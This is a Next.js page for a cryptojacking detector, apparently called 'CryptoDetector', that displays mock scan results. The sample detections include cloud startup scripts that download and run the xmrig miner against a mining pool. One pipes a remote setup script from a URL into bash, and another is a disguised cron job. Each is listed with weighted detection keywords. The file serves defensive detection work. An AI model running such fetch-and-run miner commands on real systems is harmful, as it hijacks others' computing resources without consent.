import Link from 'next/link';
import React from 'react';

export default function ResultsPage() {
  // Mock data for scan results
  const scanResults = {
    scanId: 'scan-123',
    date: '2025-03-18',
    duration: '2m 34s',
    status: 'completed',
    summary: {
      total: 12,
      high: 3,
      medium: 5,
      low: 4
    },
    detections: [
      {
        id: 1,
        severity: 'HIGH',
        source: 'AWS EC2',
        itemType: 'UserData Script',
        score: 85,
        content: '#!/bin/bash\ncurl -s -L https://github.com/xmrig/xmrig/releases/download/v6.16.4/xmrig-6.16.4-linux-static-x64.tar.gz | tar -xz\n./xmrig -o pool.minexmr.com:4444 -u 44ky1wy...',
        matches: [
          { match: 'xmrig', category: 'Miner Binary', weight: 10 },
          { match: 'pool.minexmr.com', category: 'Mining Pool', weight: 8 }
        ]
      },
      {
        id: 2,
        severity: 'HIGH',
        source: 'GCP Compute',
        itemType: 'Startup Script',
        score: 92,
        content: '#!/bin/bash\nwget -q -O - https://raw.githubusercontent.com/cryptopool/miner-setup/master/setup.sh | bash\n# Mining wallet: 3FsNSRRbmjyMkQbV7CuH6B...',
        matches: [
          { match: 'cryptopool', category: 'Mining Pool', weight: 8 },
          { match: 'miner-setup', category: 'Miner Setup', weight: 7 }
        ]
      },
      {
        id: 3,
        severity: 'MEDIUM',
        source: 'Azure VM',
        itemType: 'Extension Script',
        score: 65,
        content: '#!/bin/bash\napt-get update\napt-get install -y build-essential libssl-dev libcurl4-openssl-dev\ngit clone https://github.com/crypto/hidden-miner.git\ncd hidden-miner && ./build.sh',
        matches: [
          { match: 'hidden-miner', category: 'Suspicious Name', weight: 6 }
        ]
      },
      {
        id: 4,
        severity: 'LOW',
        source: 'Local System',
        itemType: 'Cron Job',
        score: 35,
        content: '*/15 * * * * /usr/local/bin/monitor-cpu --threads=4 --background',
        matches: [
          { match: 'monitor-cpu', category: 'Suspicious Name', weight: 3 }
        ]
      }
    ]
  };

  return (
    <div className="min-h-screen bg-gray-50 dark:bg-gray-900">
      {/* Navigation */}
      <nav className="bg-white dark:bg-gray-800 shadow-sm">
        <div className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8">
          <div className="flex justify-between h-16">
            <div className="flex">
              <div className="flex-shrink-0 flex items-center">
                <span className="text-xl font-bold text-blue-600 dark:text-blue-400">CryptoDetector</span>
              </div>
              <div className="hidden sm:ml-6 sm:flex sm:space-x-8">
                <Link href="/" className="border-transparent text-gray-500 dark:text-gray-300 hover:text-gray-700 dark:hover:text-white hover:border-gray-300 inline-flex items-center px-1 pt-1 border-b-2 text-sm font-medium">
                  Home
                </Link>
                <Link href="/dashboard" className="border-transparent text-gray-500 dark:text-gray-300 hover:text-gray-700 dark:hover:text-white hover:border-gray-300 inline-flex items-center px-1 pt-1 border-b-2 text-sm font-medium">
                  Dashboard
                </Link>
                <Link href="/scan" className="border-transparent text-gray-500 dark:text-gray-300 hover:text-gray-700 dark:hover:text-white hover:border-gray-300 inline-flex items-center px-1 pt-1 border-b-2 text-sm font-medium">
                  Scan
                </Link>
                <Link href="/results" className="border-blue-500 text-gray-900 dark:text-white inline-flex items-center px-1 pt-1 border-b-2 text-sm font-medium">
                  Results
                </Link>
              </div>
            </div>
          </div>
        </div>
      </nav>

      {/* Results Content */}
      <div className="py-10">
        <header>
          <div className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8">
            <h1 className="text-3xl font-bold text-gray-900 dark:text-white">Scan Results</h1>
          </div>
        </header>
        <main>
          <div className="max-w-7xl mx-auto sm:px-6 lg:px-8">
            {/* Scan Metadata */}
            <div className="px-4 py-5 sm:px-0">
              <div className="bg-white dark:bg-gray-800 shadow overflow-hidden sm:rounded-lg">
                <div className="px-4 py-5 sm:px-6">
                  <h3 className="text-lg leading-6 font-medium text-gray-900 dark:text-white">
                    Scan Information
                  </h3>
                  <p className="mt-1 max-w-2xl text-sm text-gray-500 dark:text-gray-400">
                    Details about the cryptojacking detection scan.
                  </p>
                </div>
                <div className="border-t border-gray-200 dark:border-gray-700 px-4 py-5 sm:p-0">
                  <dl className="sm:divide-y sm:divide-gray-200 sm:dark:divide-gray-700">
                    <div className="py-4 sm:py-5 sm:grid sm:grid-cols-3 sm:gap-4 sm:px-6">
                      <dt className="text-sm font-medium text-gray-500 dark:text-gray-400">
                        Scan ID
                      </dt>
                      <dd className="mt-1 text-sm text-gray-900 dark:text-white sm:mt-0 sm:col-span-2">
                        {scanResults.scanId}
                      </dd>
                    </div>
                    <div className="py-4 sm:py-5 sm:grid sm:grid-cols-3 sm:gap-4 sm:px-6">
                      <dt className="text-sm font-medium text-gray-500 dark:text-gray-400">
                        Date
                      </dt>
                      <dd className="mt-1 text-sm text-gray-900 dark:text-white sm:mt-0 sm:col-span-2">
                        {scanResults.date}
                      </dd>
                    </div>
                    <div className="py-4 sm:py-5 sm:grid sm:grid-cols-3 sm:gap-4 sm:px-6">
                      <dt className="text-sm font-medium text-gray-500 dark:text-gray-400">
                        Duration
                      </dt>
                      <dd className="mt-1 text-sm text-gray-900 dark:text-white sm:mt-0 sm:col-span-2">
                        {scanResults.duration}
                      </dd>
                    </div>
                    <div className="py-4 sm:py-5 sm:grid sm:grid-cols-3 sm:gap-4 sm:px-6">
                      <dt className="text-sm font-medium text-gray-500 dark:text-gray-400">
                        Status
                      </dt>
                      <dd className="mt-1 text-sm text-gray-900 dark:text-white sm:mt-0 sm:col-span-2">
                        <span className="px-2 inline-flex text-xs leading-5 font-semibold rounded-full bg-green-100 text-green-800 dark:bg-green-800 dark:text-green-100">
                          {scanResults.status.toUpperCase()}
                        </span>
                      </dd>
                    </div>
                  </dl>
                </div>
              </div>
            </div>

            {/* Detections List */}
            <div className="mt-8 px-4 sm:px-0">
              <h2 className="text-lg leading-6 font-medium text-gray-900 dark:text-white">Detections</h2>
              <div className="mt-2 flex flex-col">
                <div className="-my-2 overflow-x-auto sm:-mx-6 lg:-mx-8">
                  <div className="py-2 align-middle inline-block min-w-full sm:px-6 lg:px-8">
                    <div className="shadow overflow-hidden border-b border-gray-200 dark:border-gray-700 sm:rounded-lg">
                      <div className="divide-y divide-gray-200 dark:divide-gray-700">
                        {scanResults.detections.map((detection) => (
                          <div key={detection.id} className="bg-white dark:bg-gray-800 px-4 py-5 sm:px-6">
                            <div className="flex items-center justify-between">
                              <h3 className="text-lg leading-6 font-medium text-gray-900 dark:text-white flex items-center">
                                <span className={`mr-2 inline-flex items-center px-2.5 py-0.5 rounded-full text-xs font-medium ${
                                  detection.severity === 'HIGH' ? 'bg-red-100 text-red-800 dark:bg-red-800 dark:text-red-100' :
                                  detection.severity === 'MEDIUM' ? 'bg-yellow-100 text-yellow-800 dark:bg-yellow-800 dark:text-yellow-100' :
                                  'bg-blue-100 text-blue-800 dark:bg-blue-800 dark:text-blue-100'
                                }`}>
                                  {detection.severity}
                                </span>
                                {detection.source} - {detection.itemType}
                              </h3>
                              <p className="mt-1 max-w-2xl text-sm text-gray-500 dark:text-gray-400">
                                Score: {detection.score}
                              </p>
                            </div>
                            <div className="mt-4">
                              <div className="bg-gray-50 dark:bg-gray-900 p-4 rounded-md">
                                <pre className="text-sm text-gray-800 dark:text-gray-200 whitespace-pre-wrap font-mono">
                                  {detection.content}
                                </pre>
                              </div>
                            </div>
                            <div className="mt-4">
                              <h4 className="text-sm font-medium text-gray-500 dark:text-gray-400">Matches:</h4>
                              <ul className="mt-2 divide-y divide-gray-200 dark:divide-gray-700">
                                {detection.matches.map((match, index) => (
                                  <li key={index} className="py-2 flex justify-between">
                                    <div className="flex items-center">
                                      <span className="text-sm text-gray-900 dark:text-white">{match.match}</span>
                                      <span className="ml-2 text-xs text-gray-500 dark:text-gray-400">({match.category})</span>
                                    </div>
                                    <span className="text-sm text-gray-500 dark:text-gray-400">Weight: {match.weight}</span>
                                  </li>
                                ))}
                              </ul>
                            </div>
                          </div>
                        ))}
                      </div>
                    </div>
                  </div>
                </div>
              </div>
            </div>
          </div>
        </main>
      </div>
    </div>
  );
}
